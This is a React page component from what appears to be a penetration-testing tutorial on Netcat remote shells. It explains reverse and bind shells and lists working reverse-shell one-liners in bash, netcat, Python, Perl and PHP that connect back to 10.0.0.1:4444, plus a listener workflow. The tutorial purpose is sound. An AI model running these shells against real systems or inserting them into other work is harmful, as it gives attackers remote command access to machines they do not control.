'use client'

import { useEffect } from 'react';
import DocHeading from '@/components/base/DocHeading';
import Callout from '@/components/base/Callout';
import InlineCode from '@/components/base/InlineCode';
import CodeBlock from '@/components/base/Codeblock';
import { motion } from 'framer-motion';

const fadeUp = {
  hidden: { opacity: 0, y: 24 },
  visible: { opacity: 1, y: 0 },
};

export default function NetcatRemoteShellPage() {
  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  return (
    <div className="px-6 md:px-12 lg:px-16 py-10 max-w-5xl">
      <motion.div initial="hidden" animate="visible" variants={fadeUp} transition={{ duration: 0.5 }}>
        <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-cyber-red/10 border border-cyber-red/20 text-cyber-red text-xs font-medium font-mono mb-4">
          <i className="ri-terminal-box-line" />
          Netcat Section 6 of 14
        </div>
        <DocHeading level={1}>Remote Shell</DocHeading>
        <p className="text-cyber-text leading-relaxed mt-3 text-lg">
          Netcat is commonly used to create reverse and bind shells — a method of obtaining interactive command-line access to a remote system. This is a core technique in penetration testing for post-exploitation and maintaining access.
        </p>
      </motion.div>

      {/* Shell Types */}
      <motion.section className="mt-12" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <DocHeading level={2}>Reverse Shell vs Bind Shell</DocHeading>
        <p className="text-cyber-text leading-relaxed mt-3">
          Understanding the two fundamental shell types:
        </p>
        <div className="mt-4 grid grid-cols-1 md:grid-cols-2 gap-4">
          <div className="cyber-card p-5">
            <h3 className="text-sm font-semibold text-white mb-2">Reverse Shell</h3>
            <p className="text-xs text-cyber-text">
              The target machine connects <em>back</em> to the attacker's machine. Useful when the target is behind NAT or a firewall that blocks inbound connections but allows outbound.
            </p>
            <CodeBlock code="nc -e /bin/bash 10.0.0.1 4444" className="mt-3" />
          </div>
          <div className="cyber-card p-5">
            <h3 className="text-sm font-semibold text-white mb-2">Bind Shell</h3>
            <p className="text-xs text-cyber-text">
              The target machine listens on a port and waits for the attacker to connect. The attacker directly connects to the target.
            </p>
            <CodeBlock code="nc -l -p 4444 -e /bin/bash" className="mt-3" />
          </div>
        </div>
      </motion.section>

      {/* Examples */}
      <motion.section className="mt-12" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <DocHeading level={2}>Common Reverse Shell One-Liners</DocHeading>
        <p className="text-cyber-text leading-relaxed mt-3">
          These one-liners work on various targets. Choose the appropriate one based on the shell available (bash, sh, Python, Perl, etc.).
        </p>
        <div className="mt-6 space-y-4">
          <div className="cyber-card p-5">
            <h3 className="text-sm font-semibold text-white mb-2">Bash Reverse Shell</h3>
            <CodeBlock code="bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" />
            <p className="text-xs text-cyber-text mt-3">
              Pure bash reverse shell. Works on most Linux systems with bash available. Sends interactive shell to attacker.
            </p>
          </div>

          <div className="cyber-card p-5">
            <h3 className="text-sm font-semibold text-white mb-2">Netcat Classic Reverse Shell</h3>
            <CodeBlock code="nc -e /bin/bash 10.0.0.1 4444" />
            <p className="text-xs text-cyber-text mt-3">
              Classic netcat with <InlineCode>-e</InlineCode> to execute a shell and pipe input/output to the network. Note: <InlineCode>-e</InlineCode> is not available in all netcat versions (often missing in OpenBSD netcat).
            </p>
          </div>

          <div className="cyber-card p-5">
            <h3 className="text-sm font-semibold text-white mb-2">Python Reverse Shell</h3>
            <CodeBlock code={`python3 -c "import os,pty,socket;s=socket.socket();s.connect(('10.0.0.1',4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn('/bin/bash')"`} />
            <p className="text-xs text-cyber-text mt-3">
              Python is present on many systems and provides a reliable reverse shell without relying on netcat's <InlineCode>-e</InlineCode> flag.
            </p>
          </div>

          <div className="cyber-card p-5">
            <h3 className="text-sm font-semibold text-white mb-2">Perl Reverse Shell</h3>
            <CodeBlock code={`perl -e 'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`} />
            <p className="text-xs text-cyber-text mt-3">
              Perl-based reverse shell. Useful on older Red Hat/CentOS systems where Perl is more common than Python.
            </p>
          </div>

          <div className="cyber-card p-5">
            <h3 className="text-sm font-semibold text-white mb-2">PHP Reverse Shell</h3>
            <CodeBlock code={`php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`} />
            <p className="text-xs text-cyber-text mt-3">
              PHP reverse shell for web application compromises where you have code execution. Execute via <InlineCode>php -r</InlineCode> or drop a PHP web shell.
            </p>
          </div>
        </div>
      </motion.section>

      {/* Full Workflow */}
      <motion.section className="mt-12" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <DocHeading level={2}>Reverse Shell Workflow</DocHeading>
        <p className="text-cyber-text leading-relaxed mt-3">
          Setting up a reverse shell involves three steps:
        </p>
        <div className="mt-6 cyber-card p-5">
          <h3 className="text-sm font-semibold text-white mb-4">Step-by-Step</h3>
          <div className="space-y-4">
            <div className="flex items-start gap-3">
              <span className="w-7 h-7 rounded-full bg-cyber-red/10 border border-cyber-red/20 flex items-center justify-center text-cyber-red text-xs font-bold flex-shrink-0">1</span>
              <div>
                <h4 className="text-sm font-semibold text-white">Start Listener</h4>
                <p className="text-xs text-cyber-text mt-1">
                  On your attacker machine, start a netcat listener: <InlineCode>nc -lvp 4444</InlineCode>
                </p>
              </div>
            </div>
            <div className="flex items-start gap-3">
              <span className="w-7 h-7 rounded-full bg-cyber-red/10 border border-cyber-red/20 flex items-center justify-center text-cyber-red text-xs font-bold flex-shrink-0">2</span>
              <div>
                <h4 className="text-sm font-semibold text-white">Execute Shell on Target</h4>
                <p className="text-xs text-cyber-text mt-1">
                  On the target, run your chosen reverse shell one-liner, pointing to your attacker IP and port.
                </p>
              </div>
            </div>
            <div className="flex items-start gap-3">
              <span className="w-7 h-7 rounded-full bg-cyber-red/10 border border-cyber-red/20 flex items-center justify-center text-cyber-red text-xs font-bold flex-shrink-0">3</span>
              <div>
                <h4 className="text-sm font-semibold text-white">Interact</h4>
                <p className="text-xs text-cyber-text mt-1">
                  The listener receives a shell. Type commands, explore the filesystem, escalate privileges.
                </p>
              </div>
            </div>
          </div>
        </div>
      </motion.section>

      {/* Common Netcat Flags */}
      <motion.section className="mt-12" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <DocHeading level={2}>Essential Netcat Flags for Shells</DocHeading>
        <div className="mt-4 overflow-x-auto">
          <table className="w-full text-sm border border-cyber-border rounded-lg overflow-hidden">
            <thead className="bg-cyber-bg-card">
              <tr>
                <th className="text-left px-4 py-3 text-cyber-text font-semibold">Flag</th>
                <th className="text-left px-4 py-3 text-cyber-text font-semibold">Description</th>
                <th className="text-left px-4 py-3 text-cyber-text font-semibold">Example Use</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-cyber-border">
              <tr className="hover:bg-cyber-bg-card/50 transition-colors">
                <td className="px-4 py-3 font-mono text-cyber-red text-xs">-e</td>
                <td className="px-4 py-3 text-cyber-text text-xs">Execute a program after connection</td>
                <td className="px-4 py-3 font-mono text-cyber-cyan text-xs">nc -e /bin/bash 10.0.0.1 4444</td>
              </tr>
              <tr className="hover:bg-cyber-bg-card/50 transition-colors">
                <td className="px-4 py-3 font-mono text-cyber-red text-xs">-l</td>
                <td className="px-4 py-3 text-cyber-text text-xs">Listen mode (server)</td>
                <td className="px-4 py-3 font-mono text-cyber-cyan text-xs">nc -l -p 4444</td>
              </tr>
              <tr className="hover:bg-cyber-bg-card/50 transition-colors">
                <td className="px-4 py-3 font-mono text-cyber-red text-xs">-p</td>
                <td className="px-4 py-3 text-cyber-text text-xs">Specify port number</td>
                <td className="px-4 py-3 font-mono text-cyber-cyan text-xs">nc -l -p 4444</td>
              </tr>
              <tr className="hover:bg-cyber-bg-card/50 transition-colors">
                <td className="px-4 py-3 font-mono text-cyber-red text-xs">-v</td>
                <td className="px-4 py-3 text-cyber-text text-xs">Verbose output</td>
                <td className="px-4 py-3 font-mono text-cyber-cyan text-xs">nc -v 10.0.0.1 4444</td>
              </tr>
              <tr className="hover:bg-cyber-bg-card/50 transition-colors">
                <td className="px-4 py-3 font-mono text-cyber-red text-xs">-n</td>
                <td className="px-4 py-3 text-cyber-text text-xs">Skip DNS resolution</td>
                <td className="px-4 py-3 font-mono text-cyber-cyan text-xs">nc -n 10.0.0.1 4444</td>
              </tr>
              <tr className="hover:bg-cyber-bg-card/50 transition-colors">
                <td className="px-4 py-3 font-mono text-cyber-red text-xs">-w</td>
                <td className="px-4 py-3 text-cyber-text text-xs">Timeout for connections</td>
                <td className="px-4 py-3 font-mono text-cyber-cyan text-xs">nc -w 3 10.0.0.1 4444</td>
              </tr>
            </tbody>
          </table>
        </div>
      </motion.section>

      {/* Tips */}
      <motion.section className="mt-12 mb-16" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <Callout type="danger">
          Reverse shells provide direct command execution. Only use these techniques on systems you own or have explicit written authorization to test.
        </Callout>

        <div className="mt-8 flex gap-3">
          <a href="/netcat/flags" className="px-5 py-2.5 rounded-lg bg-cyber-amber text-black text-sm font-semibold hover:bg-cyber-amber/80 transition-all whitespace-nowrap">
            Next: Flags & Options <i className="ri-arrow-right-line ml-1" />
          </a>
          <a href="/netcat/chat" className="px-5 py-2.5 rounded-lg border border-cyber-border text-sm font-semibold text-cyber-text hover:border-cyber-amber hover:text-cyber-amber transition-all whitespace-nowrap">
            <i className="ri-arrow-left-line mr-1" /> Back
          </a>
        </div>
      </motion.section>
    </div>
  );
}
